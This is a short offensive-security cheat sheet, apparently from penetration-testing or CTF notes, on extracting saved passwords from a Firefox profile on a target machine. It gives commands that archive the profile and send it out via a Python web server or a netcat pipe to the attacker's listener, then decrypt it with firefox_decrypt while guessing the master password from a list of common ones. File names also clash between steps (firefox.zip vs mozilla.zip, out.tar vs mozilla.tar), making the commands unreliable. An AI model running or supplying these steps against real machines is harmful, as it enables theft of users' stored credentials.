## Extract Passwords from Firefox Profile

### 1. Transfer the .firefox Directory

- **Zip**

    First, zip **.firefox** directory in target machine, and open web server to transfer the zip file to local machine.

    ```sh
    zip -r /tmp/firefox.zip .firefox
    cd /tmp
    python3 -m http.server 8000
    ```

    In local machine, download the zip file from the remote machine, and decompress it.

    ```sh
    wget http://<target-ip>:8000/mozilla.zip
    unzip mozilla.zip
    ```

- **Tar**

    If we cannot use zip, tar also can be used.  
    In local machine, start listener for getting the archived directory.  
    "out.tar" will be created when the remote machine will send the compressed directory.

    ```sh
    nc -lvnp 1234 > out.tar
    ```

    In remote machine, compress the directory and transfer over netcat.

    ```sh
    tar -cf - mozilla/ | nc <local-ip> 1234
    ```

    Then, decompress it in local.

    ```sh
    tar -xf mozilla.tar
    ```

### 2. Decrypt the Password

To crack the profile of Firefox, use **[firefox_decrypt](https://github.com/unode/firefox_decrypt)**.

```sh
python3 firefox_decrypt.py .mozilla/firefox/<id>.default-release
```

If we’ll be asked the master password and we don’t know it, try common passwords.

```txt
admin
password
password1
password123
root
```
